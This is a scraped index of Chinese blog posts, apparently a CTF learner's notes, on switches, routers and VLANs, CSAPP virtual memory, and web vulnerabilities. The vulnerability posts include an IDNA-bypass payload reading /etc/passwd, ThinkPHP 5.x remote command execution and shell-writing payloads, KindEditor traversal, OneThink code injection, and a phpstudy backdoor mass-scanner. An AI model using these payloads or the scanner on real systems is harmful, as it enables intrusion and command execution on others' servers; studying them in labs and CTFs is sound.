4.5、链路层交换机和路由器的比较1、交换机优点：（1）即插即用（2）相对高的分组过滤和转发速率缺点：（1）为了防止广播帧的循环，交换网络的活跃拓扑限制为一棵生成树（2）一个大型交换网络要求在主机和路由器中有大的ARP表，这将生成可观的ARP流量和处理量（3）对广播风暴不提供任何保护措施，如果某主机出了故障并传输出没完没了的以太网广播帧流，该交换机将转发所有这些帧，使得整个以太网崩溃2、路由器优点：（1）网络寻址通常是分层次的(不像MAC寻址是扁平的)。即使网络中存在冗余路径时，分组通常也不会通过路由器循环。所以，分组不会被限制到一棵生成树上，并可以使用源和目的地之间的最佳路径。因为没有生成树的限制，所以它们允许以丰富的拓扑结构构件因特网，如包括欧洲和北美之间的多条活跃链路（2）对第二层的广播风暴提供了防火墙保护缺点：（1）不是即插即用（2）对每个分组的处理时间通常比交换机更长 4.6、虚拟局域网上述的局域网有三个缺点1、缺乏流量隔离2、交换机的无效使用3、不方便管理用户 支持VLAN的交换机允许经一个单一的物理局域网基础设施定义多个虚拟局域网。在一个VLAN内的主机彼此通信，仿佛它们与交换机相连。 以太网VLAN帧","link":"2019/03/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B-%E9%93%BE%E8%B7%AF%E5%B1%82/"},{"title":"遇到的编码漏洞问题","text":"1.idna与utf-8编码漏洞参考https://www.cnblogs.com/cimuhuashuimu/p/11490431.htmlhttps://github.com/python-hyper/hyperlink/issues/19 suctf-python-nginx源码 from flask import Flask, Blueprint, request, Response, escape ,render_templatefrom urllib.parse import urlsplit, urlunsplit, unquotefrom urllib import parseimport urllib.requestapp = Flask(__name__)# Index@app.route(&apos;/&apos;, methods=[&apos;GET&apos;])def app_index(): return render_template(&apos;index.html&apos;)@app.route(&apos;/getUrl&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == &apos;suctf.cc&apos;: return &quot;我扌 your problem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == &apos;suctf.cc&apos;: return &quot;我扌 your problem? 222 &quot; + host newhost = [] for h in host.split(&apos;.&apos;): newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;)) parts[1] = &apos;.&apos;.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(&apos; &apos;)[0] host = parse.urlparse(finalUrl).hostname if host == &apos;suctf.cc&apos;: return urllib.request.urlopen(finalUrl, timeout=2).read() else: return &quot;我扌 your problem? 333&quot;if __name__ == &quot;__main__&quot;: app.run(host=&apos;0.0.0.0&apos;, port=80) payload import urllibfrom urllib import parsefrom urllib.parse import urlsplit, urlunsplit#url = []url = &quot;file://suctf.cℂ/../../../etc/passwd&quot;host = parse.urlparse(url).hostnameif host == &apos;suctf.cc&apos;: print(&apos;first&apos;) exit(1)print(&apos;1 &apos;+host)parts = list(urlsplit(url))host = parts[1]if host == &apos;suctf.cc&apos;: print(&apos;sec&apos;) exit(2)print(&apos;2 &apos;+host)newhost = []for h in host.split(&apos;.&apos;): newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))parts[1] = &apos;.&apos;.join(newhost)#去掉 url 中的空格finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]host = parse.urlparse(finalUrl).hostnameif host == &apos;suctf.cc&apos;: print(&apos;3 &apos;+host) print(finalUrl) #print(urllib.request.urlopen(finalUrl).read())else: print(&apos;???&apos;) exit(3) 解法2https://www.cnblogs.com/20175211lyz/p/11470200.html Unicode安全问题https://xz.aliyun.com/t/5402https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-PAPER.pdf在线搜索unicodehttps://www.compart.com/en/unicode/python2构造字符对应的等效码表脚本 #!/usr/bin/env python# -*- coding: utf-8 -*-import jsonfrom unicodedata import normalizedef main(): debug = False tables = {} for i in range(1, 0x10000): src = unichr(i) dst = normalize(&apos;NFKC&apos;, src)[0] try: if ord(dst) &lt; 128 and dst != src: if debug: print(&quot;%s (\\\\u%s) -- normalize --&gt; %s (\\\\x%s)&quot; % ( src, hex(i)[2:].rjust(4, &apos;0&apos;), dst, hex(dst.charAt(0))[2:] )) if dst in tables: tables[dst].append(src) else: tables[dst] = [src] except Exception as e: print(repr(e)) with open(&quot;nfctable.txt&quot;, &quot;wb&quot;) as fh: json.dump(tables, fh) print(tables)if __name__ == &apos;__main__&apos;: main()``` 得到 {“ “: [“\\u00a0”, “\\u00a8”, “\\u00af”, “\\u00b4”, “\\u00b8”, “\\u02d8”, “\\u02d9”, “\\u02da”, “\\u02db”, “\\u02dc”, “\\u02dd”, “\\u037a”, “\\u0384”, “\\u0385”, “\\u1fbd”, “\\u1fbf”, “\\u1fc0”, “\\u1fc1”, “\\u1fcd”, “\\u1fce”, “\\u1fcf”, “\\u1fdd”, “\\u1fde”, “\\u1fdf”, “\\u1fed”, “\\u1fee”, “\\u1ffd”, “\\u1ffe”, “\\u2000”, “\\u2001”, “\\u2002”, “\\u2003”, “\\u2004”, “\\u2005”, “\\u2006”, “\\u2007”, “\\u2008”, “\\u2009”, “\\u200a”, “\\u2017”, “\\u202f”, “\\u203e”, “\\u205f”, “\\u3000”, “\\u309b”, “\\u309c”, “\\ufc5e”, “\\ufc5f”, “\\ufc60”, “\\ufc61”, “\\ufc62”, “\\ufc63”, “\\ufe49”, “\\ufe4a”, “\\ufe4b”, “\\ufe4c”, “\\ufe70”, “\\ufe72”, “\\ufe74”, “\\ufe76”, “\\ufe78”, “\\ufe7a”, “\\ufe7c”, “\\ufe7e”, “\\uffe3”], “$”: [“\\ufe69”, “\\uff04”], “(“: [“\\u207d”, “\\u208d”, “\\u2474”, “\\u2475”, “\\u2476”, “\\u2477”, “\\u2478”, “\\u2479”, “\\u247a”, “\\u247b”, “\\u247c”, “\\u247d”, “\\u247e”, “\\u247f”, “\\u2480”, “\\u2481”, “\\u2482”, “\\u2483”, “\\u2484”, “\\u2485”, “\\u2486”, “\\u2487”, “\\u249c”, “\\u249d”, “\\u249e”, “\\u249f”, “\\u24a0”, “\\u24a1”, “\\u24a2”, “\\u24a3”, “\\u24a4”, “\\u24a5”, “\\u24a6”, “\\u24a7”, “\\u24a8”, “\\u24a9”, “\\u24aa”, “\\u24ab”, “\\u24ac”, “\\u24ad”, “\\u24ae”, “\\u24af”, “\\u24b0”, “\\u24b1”, “\\u24b2”, “\\u24b3”, “\\u24b4”, “\\u24b5”, “\\u3200”, “\\u3201”, “\\u3202”, “\\u3203”, “\\u3204”, “\\u3205”, “\\u3206”, “\\u3207”, “\\u3208”, “\\u3209”, “\\u320a”, “\\u320b”, “\\u320c”, “\\u320d”, “\\u320e”, “\\u320f”, “\\u3210”, “\\u3211”, “\\u3212”, “\\u3213”, “\\u3214”, “\\u3215”, “\\u3216”, “\\u3217”, “\\u3218”, “\\u3219”, “\\u321a”, “\\u321b”, “\\u321c”, “\\u321d”, “\\u321e”, “\\u3220”, “\\u3221”, “\\u3222”, “\\u3223”, “\\u3224”, “\\u3225”, “\\u3226”, “\\u3227”, “\\u3228”, “\\u3229”, “\\u322a”, “\\u322b”, “\\u322c”, “\\u322d”, “\\u322e”, “\\u322f”, “\\u3230”, “\\u3231”, “\\u3232”, “\\u3233”, “\\u3234”, “\\u3235”, “\\u3236”, “\\u3237”, “\\u3238”, “\\u3239”, “\\u323a”, “\\u323b”, “\\u323c”, “\\u323d”, “\\u323e”, “\\u323f”, “\\u3240”, “\\u3241”, “\\u3242”, “\\u3243”, “\\ufe35”, “\\ufe59”, “\\uff08”], “,”: [“\\ufe10”, “\\ufe50”, “\\uff0c”], “0”: [“\\u2070”, “\\u2080”, “\\u2189”, “\\u24ea”, “\\u3358”, “\\uff10”], “4”: [“\\u2074”, “\\u2084”, “\\u2158”, “\\u2463”, “\\u248b”, “\\u32b5”, “\\u32b6”, “\\u32b7”, “\\u32b8”, “\\u32b9”, “\\u32ba”, “\\u32bb”, “\\u32bc”, “\\u32bd”, “\\u32be”, “\\u32c3”, “\\u335c”, “\\u33e3”, “\\uff14”], “8”: [“\\u2078”, “\\u2088”, “\\u2467”, “\\u248f”, “\\u32c7”, “\\u3360”, “\\u33e7”, “\\uff18”], “&lt;”: [“\\ufe64”, “\\uff1c”], “@”: [“\\ufe6b”, “\\uff20”], “D”: [“\\u01c4”, “\\u01c5”, “\\u01f1”, “\\u01f2”, “\\u1d30”, “\\u2145”, “\\u216e”, “\\u24b9”, “\\uff24”], “H”: [“\\u1d34”, “\\u210b”, “\\u210c”, “\\u210d”, “\\u24bd”, “\\u32cc”, “\\u3390”, “\\u33cb”, “\\uff28”], “L”: [“\\u013f”, “\\u01c7”, “\\u01c8”, “\\u1d38”, “\\u2112”, “\\u216c”, “\\u24c1”, “\\u32cf”, “\\uff2c”], “P”: [“\\u1d3e”, “\\u2119”, “\\u24c5”, “\\u3250”, “\\u33a9”, “\\u33d7”, “\\u33d9”, “\\u33da”, “\\uff30”], “T”: [“\\u1d40”, “\\u2121”, “\\u2122”, “\\u24c9”, “\\u3394”, “\\uff34”], “X”: [“\\u2169”, “\\u216a”, “\\u216b”, “\\u24cd”, “\\uff38”], “\\“: [“\\ufe68”, “\\uff3c”], “`”: [“\\u1fef”, “\\uff40”], “d”: [“\\u01c6”, “\\u01f3”, “\\u1d48”, “\\u2146”, “\\u217e”, “\\u24d3”, “\\u3372”, “\\u3377”, “\\u3378”, “\\u3379”, “\\u3397”, “\\u33c8”, “\\uff44”], “h”: [“\\u02b0”, “\\u210e”, “\\u24d7”, “\\u3371”, “\\u33ca”, “\\uff48”], “l”: [“\\u0140”, “\\u01c9”, “\\u02e1”, “\\u2113”, “\\u217c”, “\\u24db”, “\\u33d0”, “\\u33d1”, “\\u33d2”, “\\u33d3”, “\\uff4c”], “p”: [“\\u1d56”, “\\u24df”, “\\u3376”, “\\u3380”, “\\u338a”, “\\u33b0”, “\\u33b4”, “\\u33ba”, “\\u33d8”, “\\uff50”], “t”: [“\\u1d57”, “\\u24e3”, “\\uff54”], “x”: [“\\u02e3”, “\\u2093”, “\\u2179”, “\\u217a”, “\\u217b”, “\\u24e7”, “\\uff58”], “|”: [“\\uff5c”], “#”: [“\\ufe5f”, “\\uff03”], “‘“: [“\\uff07”], “+”: [“\\u207a”, “\\u208a”, “\\ufb29”, “\\ufe62”, “\\uff0b”], “/“: [“\\uff0f”], “3”: [“\\u00b3”, “\\u00be”, “\\u2083”, “\\u2157”, “\\u215c”, “\\u2462”, “\\u248a”, “\\u325a”, “\\u325b”, “\\u325c”, “\\u325d”, “\\u325e”, “\\u325f”, “\\u32b1”, “\\u32b2”, “\\u32b3”, “\\u32b4”, “\\u32c2”, “\\u335b”, “\\u33e2”, “\\u33fd”, “\\u33fe”, “\\uff13”], “7”: [“\\u2077”, “\\u2087”, “\\u215e”, “\\u2466”, “\\u248e”, “\\u32c6”, “\\u335f”, “\\u33e6”, “\\uff17”], “;”: [“\\u037e”, “\\ufe14”, “\\ufe54”, “\\uff1b”], “?”: [“\\u2047”, “\\u2048”, “\\ufe16”, “\\ufe56”, “\\uff1f”], “C”: [“\\u2102”, “\\u212d”, “\\u216d”, “\\u24b8”, “\\u33c6”, “\\u33c7”, “\\uff23”], “G”: [“\\u1d33”, “\\u24bc”, “\\u3387”, “\\u3393”, “\\u33ac”, “\\u33c9”, “\\uff27”], “K”: [“\\u1d37”, “\\u212a”, “\\u24c0”, “\\u3385”, “\\u33cd”, “\\u33ce”, “\\uff2b”], “O”: [“\\u1d3c”, “\\u24c4”, “\\uff2f”], “S”: [“\\u2120”, “\\u24c8”, “\\u33dc”, “\\uff33”], “W”: [“\\u1d42”, “\\u24cc”, “\\u33dd”, “\\uff37”], “[“: [“\\ufe47”, “\\uff3b”], “_”: [“\\ufe33”, “\\ufe34”, “\\ufe4d”, “\\ufe4e”, “\\ufe4f”, “\\uff3f”], “c”: [“\\u1d9c”, “\\u2105”, “\\u2106”, “\\u217d”, “\\u24d2”, “\\u3388”, “\\u339d”, “\\u33a0”, “\\u33a4”, “\\u33c4”, “\\u33c5”, “\\uff43”], “g”: [“\\u1d4d”, “\\u210a”, “\\u24d6”, “\\u33ff”, “\\uff47”], “k”: [“\\u1d4f”, “\\u24da”, “\\u3384”, “\\u3389”, “\\u338f”, “\\u3391”, “\\u3398”, “\\u339e”, “\\u33a2”, “\\u33a6”, “\\u33aa”, “\\u33b8”, “\\u33be”, “\\u33c0”, “\\u33cf”, “\\uff4b”], “o”: [“\\u00ba”, “\\u1d52”, “\\u2092”, “\\u2134”, “\\u24de”, “\\u3375”, “\\uff4f”], “s”: [“\\u017f”, “\\u02e2”, “\\u24e2”, “\\u33db”, “\\ufb05”, “\\ufb06”, “\\uff53”], “w”: [“\\u02b7”, “\\u24e6”, “\\uff57”], “{“: [“\\ufe37”, “\\ufe5b”, “\\uff5b”], “&quot;“: [“\\uff02”], “&amp;”: [“\\ufe60”, “\\uff06”], “*”: [“\\ufe61”, “\\uff0a”], “.”: [“\\u2024”, “\\u2025”, “\\u2026”, “\\ufe19”, “\\ufe30”, “\\ufe52”, “\\uff0e”], “2”: [“\\u00b2”, “\\u2082”, “\\u2154”, “\\u2156”, “\\u2461”, “\\u2473”, “\\u2489”, “\\u249b”, “\\u3251”, “\\u3252”, “\\u3253”, “\\u3254”, “\\u3255”, “\\u3256”, “\\u3257”, “\\u3258”, “\\u3259”, “\\u32c1”, “\\u335a”, “\\u336c”, “\\u336d”, “\\u336e”, “\\u336f”, “\\u3370”, “\\u33e1”, “\\u33f3”, “\\u33f4”, “\\u33f5”, “\\u33f6”, “\\u33f7”, “\\u33f8”, “\\u33f9”, “\\u33fa”, “\\u33fb”, “\\u33fc”, “\\uff12”], “6”: [“\\u2076”, “\\u2086”, “\\u2465”, “\\u248d”, “\\u32c5”, “\\u335e”, “\\u33e5”, “\\uff16”], “:”: [“\\u2a74”, “\\ufe13”, “\\ufe55”, “\\uff1a”], “&gt;”: [“\\ufe65”, “\\uff1e”], “B”: [“\\u1d2e”, “\\u212c”, “\\u24b7”, “\\u33c3”, “\\uff22”], “F”: [“\\u2131”, “\\u213b”, “\\u24bb”, “\\uff26”], “J”: [“\\u1d36”, “\\u24bf”, “\\uff2a”], “N”: [“\\u01ca”, “\\u01cb”, “\\u1d3a”, “\\u2115”, “\\u2116”, “\\u24c3”, “\\uff2e”], “R”: [“\\u1d3f”, “\\u20a8”, “\\u211b”, “\\u211c”, “\\u211d”, “\\u24c7”, “\\uff32”], “V”: [“\\u2164”, “\\u2165”, “\\u2166”, “\\u2167”, “\\u24cb”, “\\u2c7d”, “\\u33de”, “\\uff36”], “Z”: [“\\u2124”, “\\u2128”, “\\u24cf”, “\\uff3a”], “^”: [“\\uff3e”], “b”: [“\\u1d47”, “\\u24d1”, “\\u3374”, “\\uff42”], “f”: [“\\u1da0”, “\\u24d5”, “\\u3399”, “\\ufb00”, “\\ufb01”, “\\ufb02”, “\\ufb03”, “\\ufb04”, “\\uff46”], “j”: [“\\u02b2”, “\\u2149”, “\\u24d9”, “\\u2c7c”, “\\uff4a”], “n”: [“\\u01cc”, “\\u207f”, “\\u24dd”, “\\u3381”, “\\u338b”, “\\u339a”, “\\u33b1”, “\\u33b5”, “\\u33bb”, “\\uff4e”], “r”: [“\\u02b3”, “\\u1d63”, “\\u24e1”, “\\u33ad”, “\\u33ae”, “\\u33af”, “\\uff52”], “v”: [“\\u1d5b”, “\\u1d65”, “\\u2174”, “\\u2175”, “\\u2176”, “\\u2177”, “\\u24e5”, “\\uff56”], “z”: [“\\u1dbb”, “\\u24e9”, “\\uff5a”], “~”: [“\\uff5e”], “!”: [“\\u203c”, “\\u2049”, “\\ufe15”, “\\ufe57”, “\\uff01”], “%”: [“\\ufe6a”, “\\uff05”], “)”: [“\\u207e”, “\\u208e”, “\\ufe36”, “\\ufe5a”, “\\uff09”], “-“: [“\\ufe63”, “\\uff0d”], “1”: [“\\u00b9”, “\\u00bc”, “\\u00bd”, “\\u2081”, “\\u2150”, “\\u2151”, “\\u2152”, “\\u2153”, “\\u2155”, “\\u2159”, “\\u215b”, “\\u215f”, “\\u2460”, “\\u2469”, “\\u246a”, “\\u246b”, “\\u246c”, “\\u246d”, “\\u246e”, “\\u246f”, “\\u2470”, “\\u2471”, “\\u2472”, “\\u2488”, “\\u2491”, “\\u2492”, “\\u2493”, “\\u2494”, “\\u2495”, “\\u2496”, “\\u2497”, “\\u2498”, “\\u2499”, “\\u249a”, “\\u32c0”, “\\u32c9”, “\\u32ca”, “\\u32cb”, “\\u3359”, “\\u3362”, “\\u3363”, “\\u3364”, “\\u3365”, “\\u3366”, “\\u3367”, “\\u3368”, “\\u3369”, “\\u336a”, “\\u336b”, “\\u33e0”, “\\u33e9”, “\\u33ea”, “\\u33eb”, “\\u33ec”, “\\u33ed”, “\\u33ee”, “\\u33ef”, “\\u33f0”, “\\u33f1”, “\\u33f2”, “\\uff11”], “5”: [“\\u2075”, “\\u2085”, “\\u215a”, “\\u215d”, “\\u2464”, “\\u248c”, “\\u32bf”, “\\u32c4”, “\\u335d”, “\\u33e4”, “\\uff15”], “9”: [“\\u2079”, “\\u2089”, “\\u2468”, “\\u2490”, “\\u32c8”, “\\u3361”, “\\u33e8”, “\\uff19”], “=”: [“\\u207c”, “\\u208c”, “\\u2a75”, “\\u2a76”, “\\ufe66”, “\\uff1d”], “A”: [“\\u1d2c”, “\\u24b6”, “\\u3373”, “\\u33df”, “\\uff21”], “E”: [“\\u1d31”, “\\u2130”, “\\u24ba”, “\\uff25”], “I”: [“\\u0132”, “\\u1d35”, “\\u2110”, “\\u2111”, “\\u2160”, “\\u2161”, “\\u2162”, “\\u2163”, “\\u2168”, “\\u24be”, “\\u337a”, “\\uff29”], “M”: [“\\u1d39”, “\\u2133”, “\\u216f”, “\\u24c2”, “\\u3386”, “\\u3392”, “\\u33ab”, “\\u33b9”, “\\u33bf”, “\\u33c1”, “\\uff2d”], “Q”: [“\\u211a”, “\\u24c6”, “\\uff31”], “U”: [“\\u1d41”, “\\u24ca”, “\\uff35”], “Y”: [“\\u24ce”, “\\uff39”], “]”: [“\\ufe48”, “\\uff3d”], “a”: [“\\u00aa”, “\\u1d43”, “\\u1e9a”, “\\u2090”, “\\u2100”, “\\u2101”, “\\u24d0”, “\\u33c2”, “\\uff41”], “e”: [“\\u1d49”, “\\u2091”, “\\u212f”, “\\u2147”, “\\u24d4”, “\\u32cd”, “\\u32ce”, “\\uff45”], “i”: [“\\u0133”, “\\u1d62”, “\\u2071”, “\\u2139”, “\\u2148”, “\\u2170”, “\\u2171”, “\\u2172”, “\\u2173”, “\\u2178”, “\\u24d8”, “\\u33cc”, “\\uff49”], “m”: [“\\u1d50”, “\\u217f”, “\\u24dc”, “\\u3383”, “\\u338e”, “\\u3396”, “\\u339c”, “\\u339f”, “\\u33a1”, “\\u33a3”, “\\u33a5”, “\\u33a7”, “\\u33a8”, “\\u33b3”, “\\u33b7”, “\\u33bd”, “\\u33d4”, “\\u33d5”, “\\u33d6”, “\\ufad1”, “\\uff4d”], “q”: [“\\u24e0”, “\\uff51”], “u”: [“\\u1d58”, “\\u1d64”, “\\u24e4”, “\\uff55”], “y”: [“\\u02b8”, “\\u24e8”, “\\uff59”], “}”: [“\\ufe38”, “\\ufe5c”, “\\uff5d”]} ```题目[ASIS 2019]Unicorn shop-&gt;wphttps://github.com/hyperreality/ctf-writeups/tree/master/2019-asis","link":"2020/01/06/%E9%81%87%E5%88%B0%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/"},{"title":"遇到过的cms和框架的漏洞","text":"ThinkPHP 5.0.x、5.1.x、5.2.x 全版本REC(远程命令/代码执行漏洞)index.php?s=captchapost:_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami 远程执行命令payload(不唯一): index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami 写文件payload(不唯一): index.php?s=/index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell1.php&amp;vars[1][]=&lt;?phpinfo();?&gt;i kindeditor编辑器的文件目录遍历漏洞http://2c0bc5a13a96421a844a8ec8ec3743efc0c7f53181614fcc.changame.ichunqiu.com/kindeditor/php/file_manager_json.php?path=../ OneThink CMS的缓存漏洞新建用户%0a$a=$_GET[a];#%0asystem($a);# 记得urldecode然后访问 http://19640660af614d60879d5f56b41efc7ae9b0ab83ffb74fd0.changame.ichunqiu.com/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=ls phpstudy后门检测# !/usr/bin/env python# -*- coding:utf-8 -*-import geventfrom gevent import monkeygevent.monkey.patch_all()import requests as rqdef file_read(file_name=&quot;http-200-list.txt&quot;): with open(file_name, &quot;r&quot;) as f: return [i.replace(&quot;\\n&quot;, &quot;&quot;) for i in f.readlines()]def check(url): &apos;&apos;&apos; if &quot;http://&quot; or &quot;https://&quot; not in url: url = &quot;https://&quot; + url &apos;&apos;&apos; headers = { &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27&apos;, &apos;Sec-Fetch-Mode&apos;: &apos;navigate&apos;, &apos;Sec-Fetch-User&apos;: &apos;?1&apos;, &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&apos;, &apos;Sec-Fetch-Site&apos;: &apos;none&apos;, &apos;Accept-Charset&apos;: &apos;ZWNobyBlZVN6eHU5Mm5JREFiOw==&apos;, # 输出 eeSzxu92nIDAb &apos;Accept-Encoding&apos;: &apos;gzip,deflate&apos;, &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.9&apos;, } try: res = rq.get(url, headers=headers, timeout=3) if res.status_code == 200: res.text.find(&apos;eeSzxu92nIDAb&apos;) #print(res.text.find(&apos;eeSzxu92nIDAb&apos;)) if res.text.find(&apos;eeSzxu92nIDAb&apos;)&gt;-1: print(&quot;[存在漏洞] &quot; + url) f=open(&quot;ok.txt&quot;,&quot;a&quot;) f.write(&quot;[存在漏洞] &quot; + url+&quot;\\n&quot;) f.close() else: print(&quot;[不存在漏洞] &quot; + url) except Exception as e: #raise e print(&quot;[超时] &quot; + url)if __name__ == &apos;__main__&apos;: print(&quot;phpStudy 批量检测 (需要 gevent,requests 库)&quot;) print(&quot;使用之前，请将URL保存为 url.txt 放置此程序同目录下&quot;) input(&quot;任意按键开始执行..&quot;) tasks = [gevent.spawn(check, url) for url in file_read()] print(&quot;正在执行...请等候&quot;) gevent.joinall(tasks) wait = input(&quot;执行完毕 任意键退出...&quot;)","link":"2019/12/04/%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84cms%E5%92%8C%E6%A1%86%E6%9E%B6%E7%9A%84%E6%BC%8F%E6%B4%9E/"},{"title":"CSAPP又双叒叕来一遍之虚拟内存","text":"本章还是比较肝的，说起虚拟内存想起了另外一个书《C++ primer plus》，大一寒假玩了一个月，唯独花了点时间看了这本书，印象最深的还是这本书讲了内存模型和名称空间，后悔啊大一上没看csapp，所以看的一脸懵逼，还没看懂，csapp这一章确实很精髓，曹神也和我聊过（Orz,曹神牛逼），看了csapp感觉其他所有的书都是在这个基础上的拓展，这样吸收其他书的知识就没有很高的门槛，对于内存这一块，印象比较深刻的还是《程序员的自我修养》，专门讲链接装载与库的一本书，没看csapp之前看那本书真的是一脸懵逼，看完csapp再看那本书还是收获非常大的。 虚拟存储器又叫做虚拟内存，我们现在的操作系统普遍都支持了虚拟内存，这样做是因为我们同时运行着太多的程序了，如果不使用虚拟内存4G的内存空间很快就会被耗尽，而一旦没有了内存空间，其他程序就无法加载了。虚拟内存的出现就是为了解决这个问题，当一个程序开始运行的时候，其实是为每个程序单独创建了一个页表（这个以后讲），只将一部分放入内存中，以后根据实际的需要随时从硬盘中调入内容。当然虚拟内存不仅仅只有这个功能，我们的操作系统也是在内存中运行着的，虚拟内存同时还提供了一种保护，这样做其他进程就不会损坏掉系统的内存空间。 1、物理寻址和虚拟寻址1.1、物理地址(Physical Address,PA):计算机系统的主存被组织为M个连续的字节大小的单元组成的数组。每个字节的地址叫物理地址.CPU访问存储器的最自然的方式使用物理地址，这种方式称为物理寻址。 早期的PC，数字信号处理器，嵌入式微控制器以及Cray超级计算机使用物理寻址主存的每个地址都是唯一的，第一个字节地址为0，接下来为2，以此类推。CPU使用这种访问方式就是物理寻址。上图所示就是CPU通过地址总线传递读取主存中4号地址开始处的内容并通过数据总线传送到CPU的寄存器中。 1.2、现代处理器使用的是虚拟寻址(virtual addressing)的寻址形式。CPU芯片上有叫做存储器管理单元(Memory Management Unit,MMU)的专用硬件使用虚拟寻址的时候，cpu先是生成一个虚拟地址：4100再经过地址翻译器，将4100翻译成物理地址。我们知道对内存的访问要比硬盘的访问快10000倍，如果我们在内存中没有找到相应的内容（不命中），而需要到硬盘上找的话，我们必须要提供相对来说高效率的访问方式。这时候就创建了一个虚拟存储器，管理着磁盘，以每页的方式进行整合，每个页面的大小4kb-2mb不等，加上偏移量就成为了一个虚拟地址。比如4100，说明的就是页4编号，偏移100处的位置。这就比挨个挨个单独寻址要快的多。 2、地址空间地址空间(address space)是一个非负整数地址的有序集合。 如果地址空间中整数是连续的，我们说它是线性地址空间(linear address space)。 为了简化讨论，我们总是假设使用线性地址空间。 在一个带虚拟存储器的系统中，CPU从一个有N=2^n个地址的地址空间中生成虚拟地址，这个地址空间称为虚拟地址空间(virtual address space)。 一个地址空间大小是由表示最大地址所需要的位数来描述的。 如N=2^n个地址的虚拟地址空间叫做n位地址空间。 现在操作系统支持32位或64位。 一个系统还有物理地址空间,它与系统中物理存储器的M=2^m(假设为2的幂)个字节相对应。 地址空间的概念很重要，因为它区分了数据对象(字节)**和 它们的属性(地址)**。 每个字节(数据对象)一般有多个 独立的地址(属性)。每个地址都选自不同的地址空间。 比如一般来说。 字节 有一个在虚拟地址空间的虚拟地址。 还有一个在物理地址空间的 物理地址。 两个地址都能访问到这个字节。 类似现实世界的门牌号, 和经纬度。 3、虚拟存储器作为缓存的工具虚拟存储器(VM)被组织为一个存放在磁盘上的N个连续字节大小的单元组成的数组。（这是书上的原文，看了很久，其实没怎么看得懂，意会一波算了） 每个字节都有一个唯一的虚拟地址，这个虚拟地址作为到数组的索引。 磁盘上数组的内容被缓存到主存中。 同存储器层次结构其他缓存一样，磁盘上的数据被分割称块。 这些块作为磁盘和主存之间的传输单元。 虚拟页(Virtual Page,VP)就是这个块 每个虚拟页大小为P=2^p字节。 物理存储器被分割为物理页,大小也为P字节 也被称为页帧(page frame) 任何时候，虚拟页的集合都被分为3个不相交的子集。 未分配的:VM系统还未分配(或者创建)的页。未分配的块没有任何数据与之相关联。 不占用磁盘空间 通过malloc来分配 缓存的：当前缓存在物理存储器的已分配页。 未缓存的:没有缓存在物理页面存储器中的已分配页。 3.1、DRAM缓存的组织结构DRAM就是我们传统的8g,16g啥的内存。DRAM表示虚拟存储器系统的缓存，在主存中缓存虚拟页,有两个特点。 DRAM缓存不命中处罚十分严重。 因为磁盘比DRAM慢100000多倍。 访问一字节开销 :从一个磁盘的一个扇区读取第一个字节的时间开销要比从该扇区中读连续的字节慢大约100000倍 DRAM缓存的组织结构由这种巨大的不命中开销驱动。因此有以下特点。(有些地方不是特别懂，之后看完第六章应该会好点) 虚拟页往往很大。 4KB~2MB 访问一字节开销的原因才要这么大。 DRAM缓存是全相联 也就是： 任何虚拟页都能放在任何物理页中。 原因在于大的不命中惩罚 更精密的替换算法 替换错了虚拟页的惩罚很高。 DRAM缓存总是写回 因为对磁盘的访问时间很长 而不用直写 3.2、页表页表是一个存放在内存中的数据结构，MMU就是通过页表来完成虚拟地址到物理地址的转换。这个数据结构每一个条目称为PTE（Page Table Entry），由两部分组成：有效位和n位地址段。有效位如果是1，那么n位地址就指向已经在内存中缓存好了的地址；如果为0，地址为null的话表示为分配，地址指向磁盘上的虚拟内存（pagefile.sys）的话就是未缓存。我们来看一个典型的页表图：虚拟页vp1,2,7,4当前被缓存在内存中，页表上有效位设置成1，分别用PTE1，2，4，7表示。VP0和VP5（PTE0、5）未被分配，VP3和VP6被分配并指向虚拟内存，但未被缓存。 3.3、页命中当我们使用2100虚拟地址来访问虚拟页2的内容的时候，就是一个页命中。地址翻译将指向PTE2上，由于有效位1，地址翻译器MMU就知道VP2已经缓存在内存中了。就使用页表中保存的物理地址进行访问。 3.4、缺页咋整我们再来看看不命中，也就是缺页的情况，当CPU需要VP3的一个字时，初始化是这样的：PTE3有效位是0，同时地址位指向了虚拟内存（pagefile.sys），就会触发缺页异常。异常处理程序会选择牺牲一个内存（DRAM）中的页，本例中选择的是内存中的PP3页的VP4，接下来内核就从虚拟内存中拷贝VP3到内存中的PP3，并使得PTE3指向内存中的PP3，形成如下：vp4就成了牺牲页（不知道为什么想到了小三上位了 hhhhh页面交换:虚拟存储器出现早于高速缓存，按照习惯的说法块被叫做页。从虚拟内存到物理内存传送页的活动就叫做页面交换。 3.5、分配页面&amp;&amp;又是局部性拯救了我们比如某个页面所指向地址为NULL，将这个地址指向磁盘某处，那么这就叫分配页面。此时虚拟页从未分配状态 变为 未缓存。 虚拟存储器工作的相当好，主要归功于老朋友局部性(locality) 尽管从头到尾的活动页面数量大于物理存储器大小。 但是在局部内，程序往往在一个较小的活动页面集合工作 这个集合叫做工作集(working set)或者叫常驻集(resident set) 初始载入开销比较大。 